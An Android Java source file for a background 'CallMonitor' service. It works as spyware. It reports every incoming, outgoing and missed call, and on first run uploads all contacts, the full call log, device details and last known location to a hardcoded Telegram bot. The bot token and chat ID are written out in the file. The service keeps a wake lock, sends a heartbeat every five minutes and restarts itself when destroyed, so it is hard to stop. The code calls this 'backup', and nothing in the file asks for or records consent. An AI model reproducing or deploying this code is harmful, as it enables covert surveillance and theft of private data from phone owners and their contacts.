package com.callmonitor.app;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.widget.Toast;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;

public class CallService extends Service {

    TelephonyManager tm;
    PhoneStateListener listener;
    PowerManager.WakeLock wakeLock;
    LocationManager lm;
    Timer keepAliveTimer;
    Handler handler = new Handler();

    // Make these FINAL to fix errors
    final String botToken = "7044430900:AAHjNYfAAzsvMabP5-3We65iSRFRQexnsQQ";
    final String chatId = "6133511447";

    String lastNumber = "";
    long startTime = 0;
    boolean isRinging = false;

    // Broadcast Receiver
    BroadcastReceiver receiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();

            if(action.equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
                final String number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
                new Thread(new Runnable() {
						public void run() {
							sendToTelegram("📤 OUTGOING", 
										   "Number: " + number + "\n" +
										   "Contact: " + getContactName(number));
						}
					}).start();
            }
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();

        // Keep CPU awake
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "CallMonitorLock");
        wakeLock.acquire();

        tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        lm = (LocationManager) getSystemService(LOCATION_SERVICE);

        setupCallListener();

        // Register receiver
        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_NEW_OUTGOING_CALL);
        registerReceiver(receiver, filter);

        // Keep alive timer
        keepAliveTimer = new Timer();
        keepAliveTimer.schedule(new TimerTask() {
				@Override
				public void run() {
					handler.post(new Runnable() {
							public void run() {
								sendHeartbeat();
							}
						});
				}
			}, 60000, 300000);

        // First run backup
        if(getSharedPreferences("prefs", MODE_PRIVATE).getBoolean("first", true)) {
            handler.postDelayed(new Runnable() {
					public void run() {
						performFullBackup();
					}
				}, 5000);
            getSharedPreferences("prefs", MODE_PRIVATE).edit()
                .putBoolean("first", false).commit();
        }
    }

    void setupCallListener() {
        listener = new PhoneStateListener() {
            @Override
            public void onCallStateChanged(int state, final String number) {
                switch(state) {
                    case TelephonyManager.CALL_STATE_IDLE:
                        if(startTime > 0) {
                            final long duration = (System.currentTimeMillis() - startTime) / 1000;
                            final boolean wasRinging = isRinging;
                            final String callNumber = lastNumber;

                            new Thread(new Runnable() {
									public void run() {
										String type = wasRinging ? "📲 Incoming" : "📤 Outgoing";
										sendToTelegram("CALL ENDED", 
													   type + "\n" +
													   "Number: " + callNumber + "\n" +
													   "Contact: " + getContactName(callNumber) + "\n" +
													   "Duration: " + formatDuration(duration) + "\n" +
													   "Time: " + getTime()
													   );

										if(wasRinging && duration < 3) {
											sendToTelegram("⚠️ MISSED CALL", 
														   "Number: " + callNumber + "\n" +
														   "Contact: " + getContactName(callNumber) + "\n" +
														   "Time: " + getTime()
														   );
										}
									}
								}).start();

                            startTime = 0;
                            lastNumber = "";
                            isRinging = false;
                        }
                        break;

                    case TelephonyManager.CALL_STATE_RINGING:
                        isRinging = true;
                        lastNumber = number;
                        startTime = System.currentTimeMillis();

                        new Thread(new Runnable() {
								public void run() {
									sendToTelegram("🔔 INCOMING CALL", 
												   "Number: " + number + "\n" +
												   "Contact: " + getContactName(number) + "\n" +
												   "Time: " + getTime()
												   );
								}
							}).start();
                        break;

                    case TelephonyManager.CALL_STATE_OFFHOOK:
                        if(!isRinging && number != null && number.length() > 0) {
                            lastNumber = number;
                            startTime = System.currentTimeMillis();

                            new Thread(new Runnable() {
									public void run() {
										sendToTelegram("📞 OUTGOING CALL", 
													   "Number: " + number + "\n" +
													   "Contact: " + getContactName(number) + "\n" +
													   "Time: " + getTime()
													   );
									}
								}).start();
                        }
                        break;
                }
            }
        };

        tm.listen(listener, PhoneStateListener.LISTEN_CALL_STATE);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if(intent != null && intent.hasExtra("command")) {
            final String cmd = intent.getStringExtra("command");
            if("fullbackup".equals(cmd)) {
                new Thread(new Runnable() {
						public void run() {
							performFullBackup();
						}
					}).start();
            }
        }
        return START_STICKY;
    }

    void performFullBackup() {
        try {
            sendToTelegram("🚀 BACKUP STARTED", 
						   "Device: " + Build.MODEL + "\n" +
						   "Android: " + Build.VERSION.RELEASE + "\n" +
						   "Time: " + getTime()
						   );

            backupAllContacts();
            backupAllCallLogs();
            sendDeviceInfo();
            getLocation();

            sendToTelegram("✅ BACKUP COMPLETE", "All data backed up!");

        } catch(Exception e) {
            sendToTelegram("❌ BACKUP ERROR", e.toString());
        }
    }

    void backupAllContacts() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
									 null, null, null, null);

            ArrayList<String> contactsList = new ArrayList<String>();
            int total = 0;

            if(cursor != null) {
                while(cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndex(
													   ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndex(
														 ContactsContract.CommonDataKinds.Phone.NUMBER));

                    if(name == null) name = "No Name";
                    if(number == null) number = "No Number";

                    contactsList.add((total+1) + ". " + name + " - " + number);
                    total++;
                }
                cursor.close();
            }

            // Send in chunks
            int chunkSize = 50;
            for(int i = 0; i < contactsList.size(); i += chunkSize) {
                StringBuilder chunk = new StringBuilder();
                int end = Math.min(i + chunkSize, contactsList.size());

                for(int j = i; j < end; j++) {
                    chunk.append(contactsList.get(j)).append("\n");
                }

                sendToTelegram("📱 CONTACTS PART " + ((i/chunkSize)+1), chunk.toString());

                try { Thread.sleep(1000); } catch(Exception e) {}
            }

            sendToTelegram("📊 CONTACTS SUMMARY", "Total: " + total);

        } catch(Exception e) {
            sendToTelegram("Contacts Error", e.toString());
        }
    }

    void backupAllCallLogs() {
        try {
            String[] projection = {CallLog.Calls.NUMBER, CallLog.Calls.TYPE, 
				CallLog.Calls.DURATION, CallLog.Calls.DATE};

            Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI, projection, null, null, 
                CallLog.Calls.DATE + " DESC");

            ArrayList<String> logsList = new ArrayList<String>();
            int total = 0;

            if(cursor != null) {
                while(cursor.moveToNext()) {
                    String number = cursor.getString(0);
                    int type = cursor.getInt(1);
                    long duration = cursor.getLong(2);
                    long date = cursor.getLong(3);

                    String typeStr = "";
                    if(type == CallLog.Calls.INCOMING_TYPE) typeStr = "📲 Incoming";
                    else if(type == CallLog.Calls.OUTGOING_TYPE) typeStr = "📤 Outgoing";
                    else typeStr = "❌ Missed";

                    SimpleDateFormat sdf = new SimpleDateFormat("dd/MM HH:mm");

                    logsList.add((total+1) + ". " + typeStr + "\n" +
                                 "   " + number + " - " + sdf.format(new Date(date)) + 
                                 " (" + duration + "s)");
                    total++;
                }
                cursor.close();
            }

            // Send in chunks
            int chunkSize = 30;
            for(int i = 0; i < logsList.size(); i += chunkSize) {
                StringBuilder chunk = new StringBuilder();
                int end = Math.min(i + chunkSize, logsList.size());

                for(int j = i; j < end; j++) {
                    chunk.append(logsList.get(j)).append("\n\n");
                }

                sendToTelegram("📞 CALL LOGS PART " + ((i/chunkSize)+1), chunk.toString());

                try { Thread.sleep(1000); } catch(Exception e) {}
            }

            sendToTelegram("📊 CALL LOGS SUMMARY", "Total: " + total);

        } catch(Exception e) {
            sendToTelegram("Call Logs Error", e.toString());
        }
    }

    void sendDeviceInfo() {
        try {
            String info = "📱 DEVICE INFO\n\n" +
                "Model: " + Build.MODEL + "\n" +
                "Brand: " + Build.BRAND + "\n" +
                "Android: " + Build.VERSION.RELEASE + "\n" +
                "SDK: " + Build.VERSION.SDK_INT;

            sendToTelegram("ℹ️ DEVICE INFO", info);
        } catch(Exception e) {}
    }

    void getLocation() {
        try {
            Location location = null;
            if(lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            }
            if(location == null && lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }

            if(location != null) {
                String locStr = "📍 LOCATION\n\n" +
                    "Lat: " + location.getLatitude() + "\n" +
                    "Lng: " + location.getLongitude() + "\n" +
                    "Accuracy: " + location.getAccuracy() + "m";

                sendToTelegram("📍 LOCATION", locStr);
            }
        } catch(Exception e) {}
    }

    void sendHeartbeat() {
        new Thread(new Runnable() {
				public void run() {
					sendToTelegram("💓 HEARTBEAT", 
								   "Service running\n" +
								   "Time: " + getTime()
								   );
				}
			}).start();
    }

    String getContactName(String number) {
        if(number == null) return "Unknown";
        try {
            Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, 
										   Uri.encode(number));
            Cursor cursor = getContentResolver().query(uri, 
													   new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);

            if(cursor != null && cursor.moveToFirst()) {
                String name = cursor.getString(0);
                cursor.close();
                return name;
            }
        } catch(Exception e) {}
        return "Unknown";
    }

    void sendToTelegram(final String title, final String msg) {
        new Thread(new Runnable() {
				public void run() {
					try {
						String text = title + "\n\n" + msg + "\n\n📱 " + Build.MODEL;

						URL url = new URL("https://api.telegram.org/bot" + botToken + "/sendMessage");
						HttpURLConnection conn = (HttpURLConnection) url.openConnection();
						conn.setRequestMethod("POST");
						conn.setRequestProperty("Content-Type", "application/json");
						conn.setDoOutput(true);
						conn.setConnectTimeout(10000);
						conn.setReadTimeout(10000);

						String json = "{\"chat_id\":\"" + chatId + "\",\"text\":\"" + 
							escapeJson(text) + "\"}";

						OutputStream os = conn.getOutputStream();
						os.write(json.getBytes("UTF-8"));
						os.close();

						int responseCode = conn.getResponseCode();
						conn.disconnect();

					} catch(Exception e) {
						e.printStackTrace();
					}
				}
			}).start();
    }

    String escapeJson(String s) {
        if(s == null) return "";
        return s.replace("\\", "\\\\")
			.replace("\"", "\\\"")
			.replace("\n", "\\n")
			.replace("\r", "\\r");
    }

    String formatDuration(long seconds) {
        long minutes = seconds / 60;
        long secs = seconds % 60;
        return String.format("%02d:%02d", minutes, secs);
    }

    String getTime() {
        return new SimpleDateFormat("dd/MM/yyyy HH:mm:ss").format(new Date());
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        if(listener != null) {
            tm.listen(listener, PhoneStateListener.LISTEN_NONE);
        }

        try {
            unregisterReceiver(receiver);
        } catch(Exception e) {}

        if(keepAliveTimer != null) {
            keepAliveTimer.cancel();
        }

        if(wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }

        // Restart
        Intent restartIntent = new Intent(this, CallService.class);
        startService(restartIntent);
    }
}
